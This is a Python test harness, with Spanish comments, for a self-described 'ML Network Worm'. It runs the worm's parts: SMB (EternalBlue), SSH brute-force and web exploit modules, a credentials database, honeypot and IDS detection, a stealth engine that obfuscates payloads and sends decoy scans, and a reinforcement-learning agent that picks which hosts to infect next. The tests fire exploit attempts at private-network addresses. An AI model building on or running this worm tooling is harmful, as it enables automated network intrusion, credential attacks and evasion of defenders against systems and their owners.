"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Test Completo de ML Network Worm v2.0
Prueba exhaustiva de todos los componentes
"""


import os
import sys
import time

print("=" * 70)
print("🧪 TEST COMPLETO - ML NETWORK WORM v2.0")
print("=" * 70)
print()

# Contadores
tests_passed = 0
tests_failed = 0
tests_total = 0


def test(name, func):
    """Helper para ejecutar tests"""
    global tests_passed, tests_failed, tests_total
    tests_total += 1
    print(f"\n{'='*70}")
    print(f"TEST {tests_total}: {name}")
    print("=" * 70)
    try:
        func()
        tests_passed += 1
        print(f"✅ PASSED: {name}")
        return True
    except Exception as e:
        tests_failed += 1
        print(f"❌ FAILED: {name}")
        print(f"   Error: {e}")
        import traceback

        traceback.print_exc()
        return False


# ============================================================================
# TEST 1: Configuración
# ============================================================================
def test_config():
    try:
        from configs.config import Config
    except ImportError:
        from config import Config

    config = Config()
    assert config.validate(), "Config validation failed"

    print(f"✓ Target ranges: {config.network.target_ranges}")
    print(f"✓ Stealth mode: {config.evasion.stealth_mode}")
    print(f"✓ Max infections: {config.propagation.max_infections}")
    print(f"✓ Kill switch: {config.safety.kill_switch_enabled}")


test("Configuration System", test_config)


# ============================================================================
# TEST 2: Exploit Manager
# ============================================================================
def test_exploit_manager():
    from exploits.exploit_manager import ExploitManager

    try:
        from configs.config import Config
    except ImportError:
        from config import Config

    config = Config()
    manager = ExploitManager(config)

    assert len(manager.exploits) > 0, "No exploits loaded"
    assert len(manager.credentials_db) > 0, "No credentials loaded"

    print(f"✓ Exploits loaded: {len(manager.exploits)}")
    for exp in manager.exploits:
        print(f"   - {exp.name}")

    print(f"✓ Credentials loaded: {len(manager.credentials_db)}")


test("Exploit Manager", test_exploit_manager)


# ============================================================================
# TEST 3: SMB Exploit
# ============================================================================
def test_smb_exploit():
    from exploits.modules.smb_exploit import SMBExploit

    smb = SMBExploit()

    # Test vulnerable target
    target = {
        "ip": "192.168.1.100",
        "open_ports": [445],
        "os_guess": "Windows",
        "banners": {445: "Microsoft Windows SMB"},
        "vulnerability_score": 80,
    }

    vulnerable = smb.check_vulnerable(target)
    print(f"✓ Vulnerability check: {vulnerable}")

    success, result = smb.exploit(target)
    print(f"✓ Exploit attempt: {'SUCCESS' if success else 'FAILED'}")
    if result:
        print(f"   Result: {result}")


test("SMB Exploit Module", test_smb_exploit)


# ============================================================================
# TEST 4: SSH Exploit
# ============================================================================
def test_ssh_exploit():
    from exploits.modules.ssh_exploit import SSHExploit

    ssh = SSHExploit()

    target = {
        "ip": "192.168.1.101",
        "open_ports": [22],
        "os_guess": "Linux",
        "banners": {22: "SSH-2.0-OpenSSH_7.4"},
        "vulnerability_score": 60,
    }

    vulnerable = ssh.check_vulnerable(target)
    print(f"✓ Vulnerability check: {vulnerable}")

    success, result = ssh.exploit(target)
    print(f"✓ Exploit attempt: {'SUCCESS' if success else 'FAILED'}")
    if result:
        print(f"   Result: {result}")


test("SSH Exploit Module", test_ssh_exploit)


# ============================================================================
# TEST 5: Web Exploit
# ============================================================================
def test_web_exploit():
    from exploits.modules.web_exploit import WebExploit

    web = WebExploit()

    target = {
        "ip": "192.168.1.102",
        "open_ports": [80, 443],
        "os_guess": "Linux",
        "banners": {80: "Apache/2.4.41"},
        "vulnerability_score": 70,
    }

    vulnerable = web.check_vulnerable(target)
    print(f"✓ Vulnerability check: {vulnerable}")

    success, result = web.exploit(target)
    print(f"✓ Exploit attempt: {'SUCCESS' if success else 'FAILED'}")
    if result:
        print(f"   Result: {result}")


test("Web Exploit Module", test_web_exploit)


# ============================================================================
# TEST 6: Exploit Selection
# ============================================================================
def test_exploit_selection():
    from exploits.exploit_manager import ExploitManager

    try:
        from configs.config import Config
    except ImportError:
        from config import Config

    manager = ExploitManager(Config())

    # Target with multiple services
    target = {
        "ip": "192.168.1.100",
        "open_ports": [22, 80, 445],
        "os_guess": "Windows",
        "banners": {},
        "vulnerability_score": 75,
    }

    applicable = manager.select_exploits(target)
    print(f"✓ Applicable exploits: {len(applicable)}")
    for exp in applicable:
        print(f"   - {exp.name} (ports: {exp.target_ports})")


test("Exploit Selection Logic", test_exploit_selection)


# ============================================================================
# TEST 7: IDS Detector
# ============================================================================
def test_ids_detector():
    from evasion.ids_detector import IDSDetector

    try:
        from configs.config import Config
    except ImportError:
        from config import Config

    detector = IDSDetector(Config())

    # Test normal target
    normal_scan = {
        "ip": "192.168.1.100",
        "open_ports": [22, 80, 443],
        "banners": {80: "Apache/2.4.41"},
        "response_time": 50.0,
    }

    is_honeypot, conf = detector.is_honeypot(normal_scan["ip"], normal_scan)
    print(f"✓ Honeypot detection (normal): {is_honeypot} (confidence: {conf:.2f})")

    # Test suspicious target
    suspicious_scan = {
        "ip": "192.168.1.200",
        "open_ports": list(range(1, 25)),  # Too many ports
        "banners": {},
        "response_time": 10.0,
    }

    is_honeypot, conf = detector.is_honeypot(suspicious_scan["ip"], suspicious_scan)
    print(f"✓ Honeypot detection (suspicious): {is_honeypot} (confidence: {conf:.2f})")

    stats = detector.get_statistics()
    print(f"✓ Statistics: {stats}")


test("IDS/Honeypot Detector", test_ids_detector)


# ============================================================================
# TEST 8: Stealth Engine
# ============================================================================
def test_stealth_engine():
    from evasion.stealth_engine import StealthEngine

    try:
        from configs.config import Config
    except ImportError:
        from config import Config

    config = Config()
    config.evasion.stealth_mode = True
    config.evasion.randomize_timing = True

    stealth = StealthEngine(config)

    # Test delays
    delays = []
    for i in range(5):
        delay = stealth.get_scan_delay("192.168.1.100")
        delays.append(delay)

    print(f"✓ Delays generated: {[f'{d:.2f}s' for d in delays]}")
    print(f"✓ Average delay: {sum(delays)/len(delays):.2f}s")

    # Test obfuscation
    payload = b"malicious_payload_test"
    obfuscated = stealth.obfuscate_traffic(payload)
    print(f"✓ Payload obfuscated: {len(payload)} -> {len(obfuscated)} bytes")

    # Test headers
    headers = stealth.mimic_legitimate_traffic()
    print(f"✓ Legitimate headers generated: {len(headers)} headers")

    # Test decoy scans
    real_ports = [22, 80, 443]
    mixed_ports = stealth.use_decoy_scans("192.168.1.100", real_ports)
    print(f"✓ Decoy scans: {len(real_ports)} real + {len(mixed_ports) - len(real_ports)} decoys")


test("Stealth Engine", test_stealth_engine)


# ============================================================================
# TEST 9: RL Agent
# ============================================================================
def test_rl_agent():
    import numpy as np

    from rl_engine.propagation_agent import PropagationAgent

    agent = PropagationAgent(state_size=60, action_size=20, use_dqn=False)

    # Test action selection
    state = np.random.random(60)
    action = agent.act(state)
    print(f"✓ Action selected: {action}")

    # Test with available actions
    available = [0, 2, 5, 10]
    action = agent.act(state, available_actions=available)
    print(f"✓ Action from available: {action} (available: {available})")
    assert action in available, "Selected action not in available list"

    # Test memory
    agent.remember(state, action, 10.0, state, False)
    print(f"✓ Memory size: {len(agent.memory)}")

    stats = agent.get_stats()
    print(f"✓ Agent stats: {stats}")


test("RL Propagation Agent", test_rl_agent)


# ============================================================================
# TEST 10: RL Environment
# ============================================================================
def test_rl_environment():
    from rl_engine.environment import NetworkEnvironment

    env = NetworkEnvironment(network_size=10, max_steps=50)

    state = env.reset()
    print(f"✓ Environment reset, state shape: {state.shape}")

    # Run a few steps
    total_reward = 0
    for i in range(5):
        available = env.get_available_targets()
        if available:
            action = available[0]
        else:
            action = 0

        next_state, reward, done, info = env.step(action)
        total_reward += reward

        if done:
            break

    print(f"✓ Steps executed: {i+1}")
    print(f"✓ Total reward: {total_reward:.2f}")
    print(f"✓ Infected: {info['infected_count']}/{env.network_size}")


test("RL Training Environment", test_rl_environment)


# ============================================================================
# TEST 11: Visualizer
# ============================================================================
def test_visualizer():
    import shutil

    from utils.visualizer import WormVisualizer

    viz = WormVisualizer(output_dir="test_output")

    # Add test data
    viz.add_host("192.168.1.1")
    viz.add_host("192.168.1.100")
    viz.add_host("192.168.1.101")
    viz.add_host("192.168.1.102")

    viz.add_connection("192.168.1.1", "192.168.1.100")
    viz.add_connection("192.168.1.100", "192.168.1.101")

    viz.mark_infected("192.168.1.1")
    viz.mark_infected("192.168.1.100")
    viz.mark_failed("192.168.1.102")

    print(f"✓ Hosts added: {len(viz.network_graph.nodes())}")
    print(f"✓ Connections: {len(viz.network_graph.edges())}")
    print(f"✓ Infected: {len(viz.infected_nodes)}")
    print(f"✓ Failed: {len(viz.failed_nodes)}")

    # Generate visualizations
    viz.generate_report()
    viz.export_data()

    print(f"✓ Visualizations generated in test_output/")

    # Cleanup
    if os.path.exists("test_output"):
        shutil.rmtree("test_output")
        print(f"✓ Cleanup completed")


test("Visualization System", test_visualizer)


# ============================================================================
# TEST 12: Integration Test
# ============================================================================
def test_integration():
    from evasion.ids_detector import IDSDetector
    from evasion.stealth_engine import StealthEngine
    from exploits.exploit_manager import ExploitManager

    try:
        from configs.config import Config
    except ImportError:
        from config import Config

    config = Config()

    # Initialize all components
    exploit_mgr = ExploitManager(config)
    ids_detector = IDSDetector(config)
    stealth = StealthEngine(config)

    print(f"✓ All components initialized")

    # Simulate workflow
    target = {
        "ip": "192.168.1.100",
        "open_ports": [22, 80, 445],
        "os_guess": "Windows",
        "banners": {},
        "vulnerability_score": 75,
    }

    # 1. Check if honeypot
    is_honeypot, conf = ids_detector.is_honeypot(target["ip"], target)
    print(f"✓ Honeypot check: {is_honeypot} (confidence: {conf:.2f})")

    if not is_honeypot:
        # 2. Apply stealth delay
        delay = stealth.get_scan_delay(target["ip"])
        print(f"✓ Stealth delay: {delay:.2f}s")

        # 3. Select exploits
        exploits = exploit_mgr.select_exploits(target)
        print(f"✓ Exploits selected: {len(exploits)}")

        # 4. Attempt exploitation
        if exploits:
            success, result = exploits[0].exploit(target)
            print(f"✓ Exploitation: {'SUCCESS' if success else 'FAILED'}")
            if result:
                print(f"   Method: {result.get('method', 'Unknown')}")


test("Integration Test (All Components)", test_integration)

# ============================================================================
# RESUMEN FINAL
# ============================================================================
print("\n" + "=" * 70)
print("📊 RESUMEN DE TESTS")
print("=" * 70)
print(f"\n✅ Tests Passed: {tests_passed}/{tests_total}")
print(f"❌ Tests Failed: {tests_failed}/{tests_total}")
print(f"📈 Success Rate: {(tests_passed/tests_total*100):.1f}%")

if tests_failed == 0:
    print("\n🎉 ¡TODOS LOS TESTS PASARON!")
    print("\n✅ El ML Network Worm v2.0 está completamente funcional")
    print("\nComponentes verificados:")
    print("  ✓ Exploit Manager (3 exploits)")
    print("  ✓ SMB Exploit (EternalBlue)")
    print("  ✓ SSH Exploit (Brute Force)")
    print("  ✓ Web Exploit (Multiple vectors)")
    print("  ✓ IDS/Honeypot Detector")
    print("  ✓ Stealth Engine (10+ techniques)")
    print("  ✓ RL Agent (DQN)")
    print("  ✓ RL Environment (Training)")
    print("  ✓ Visualizer (Reports + Graphs)")
    print("  ✓ Integration (All components working together)")
else:
    print(f"\n⚠️  {tests_failed} test(s) fallaron")
    print("Revisa los errores arriba para más detalles")

print("\n" + "=" * 70)
print("🚀 ML Network Worm v2.0 - Ready for Red Team Operations")
print("=" * 70)
